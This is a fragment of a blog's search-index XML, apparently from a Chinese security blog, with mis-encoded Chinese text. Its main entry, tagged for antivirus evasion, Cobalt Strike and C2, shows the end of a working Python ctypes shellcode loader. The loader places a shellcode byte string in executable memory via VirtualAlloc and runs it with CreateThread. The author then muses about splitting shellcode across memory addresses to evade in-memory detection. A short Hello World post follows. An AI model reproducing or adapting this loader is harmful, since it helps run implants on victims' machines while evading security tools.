class="hljs-symbol">\x</span>87<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>d5<span class="hljs-symbol">\x</span>bb<span class="hljs-symbol">\x</span>f0<span class="hljs-symbol">\x</span>b5<span class="hljs-symbol">\x</span>a2<span class="hljs-symbol">\x</span>56<span class="hljs-symbol">\x</span>41&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>ba<span class="hljs-symbol">\x</span>a6<span class="hljs-symbol">\x</span>95<span class="hljs-symbol">\x</span>bd<span class="hljs-symbol">\x</span>9d<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>d5<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>c4<span class="hljs-symbol">\x</span>28<span class="hljs-symbol">\x</span>3c<span class="hljs-symbol">\x</span>06&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>7c<span class="hljs-symbol">\x</span>0a<span class="hljs-symbol">\x</span>80<span class="hljs-symbol">\x</span>fb<span class="hljs-symbol">\x</span>e0<span class="hljs-symbol">\x</span>75<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>bb<span class="hljs-symbol">\x</span>47<span class="hljs-symbol">\x</span>13<span class="hljs-symbol">\x</span>72<span class="hljs-symbol">\x</span>6f<span class="hljs-symbol">\x</span>6a&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>59<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>da<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>d5<span class="hljs-symbol">\x</span>63<span class="hljs-symbol">\x</span>61<span class="hljs-symbol">\x</span>6c<span class="hljs-symbol">\x</span>63<span class="hljs-symbol">\x</span>2e<span class="hljs-symbol">\x</span>65&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>78<span class="hljs-symbol">\x</span>65<span class="hljs-symbol">\x</span>00&quot;<br><br>shellcode = bytearray(shellcode)<br># è®¾ç½®VirtualAllocè¿”å›ç±»å‹ä¸ºctypes.c_uint64<br>ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64<br># ç”³è¯·å†…å­˜<br>ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))<br> <br># æ”¾å…¥shellcode<br>buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)<br>ctypes.windll.kernel32.RtlMoveMemory(<br>    ctypes.c_uint64(ptr), <br>    buf, <br>    ctypes.c_int(len(shellcode))<br>)<br># åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ä»shellcodeæ”¾ç½®ä½ç½®é¦–åœ°å€å¼€å§‹æ‰§è¡Œ<br>handle = ctypes.windll.kernel32.CreateThread(<br>    ctypes.c_int(0), <br>    ctypes.c_int(0), <br>    ctypes.c_uint64(ptr), <br>    ctypes.c_int(0), <br>    ctypes.c_int(0), <br>    ctypes.pointer(ctypes.c_int(0))<br>)<br># ç­‰å¾…ä¸Šé¢åˆ›å»ºçš„çº¿ç¨‹è¿è¡Œå®Œ<br>ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))<br></code></pre></td></tr></table></figure><hr><p>ä¸ªäººæ‰€æƒ³çš„ï¼š<br>å¯¹äºå†…å­˜å…æ€æ–¹é¢,æˆ‘æ˜¯å¦å¯ä»¥å°†shellcode æ”¾åœ¨åŒä¸€ä¸ªçº¿ç¨‹ï¼Œnä¸ªä¸åŒçš„åœ°å€ä¸Šé¢,æ‰§è¡Œçš„æ—¶å€™ä¾æ¬¡æŒ‰é¡ºåºæ‰§è¡Œã€‚shellcode ä¸å‡ºç°åˆå¹¶çš„æƒ…å†µä¸‹ä¸è¿‡å¥½åƒæ— æ³•ä»ä¸åŒçš„åœ°å€ä¸Šæ‰§è¡Œ,è²Œä¼¼å¯ä»¥åœ¨çº¿ç¨‹é‡Œåœ¨ç”³è¯·ä¸€å—å†…å­˜ç©ºé—´,å°†nä¸ªåœ°å€æ”¾è¿›å» æ‰§è¡Œã€‚  å¯¹æ­¤æ˜¯å¦å¯åœ¨å¿½ç•¥c2ç‰¹å¾çš„æƒ…å†µä¸‹ å®ç°å†…å­˜çš„é«˜çº§å…æ€ã€‚è¿˜æ˜¯æƒ³å®ç°ä¸åŒåœ°å€çš„shellcode ä¾æ¬¡æ‰§è¡Œ è¾¾åˆ°åŠ è½½shellcode çš„æ–¹æ³•ã€‚ç†è®ºä¸Šæ¥çœ‹å¥½åƒæœ‰ç‚¹ä¸ç°å®ã€‚</p><p>##end</p>]]></content>
      
      
      <categories>
          
          <category> å…æ€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python  </tag>
            
            <tag> shellcode </tag>
            
            <tag> C2 </tag>
            
            <tag> cobalt strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/11/03/hello-world/"/>
      <url>/2021/11/03/hello-world/</url>
      
        <content type="html"><![CDATA[<h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h1><p>æ¯ä¸€æ¬¡çš„ â€œhello worldâ€ æ„å‘³ç€ä¸€æ¬¡å¼€å§‹ï¼Œæˆ‘çŸ¥é“å¼€å§‹ï¼Œä½†æœªçŸ¥ç»“æŸã€‚è¿™æ˜¯ä¸€æ¡åªæœ‰å¼€å§‹ æ²¡æœ‰ç»“æŸçš„é“è·¯ã€‚ä¸çŸ¥æ˜¯å¦æœ‰äººå·²å¯»æ‰¾åˆ°ç»ˆç‚¹ã€‚ä½†æ„¿æ¯ä¸ªäººéƒ½èƒ½æ‰¾åˆ°è‡ªå·±çš„ç»ˆç‚¹ï¼Œè€Œå¹¶é â€œhello worldâ€ çš„ç»ˆç‚¹ï¼Œå°† â€œhello worldâ€ ç”»ä¸Šä¸€ä¸ªå¥å·ä¹‹å‰ï¼Œä¸è¦æ—©å·²ç¦»å»åœ¨è¿™æ¡é“è·¯ä¸Šã€‚ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸è®°å½• </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
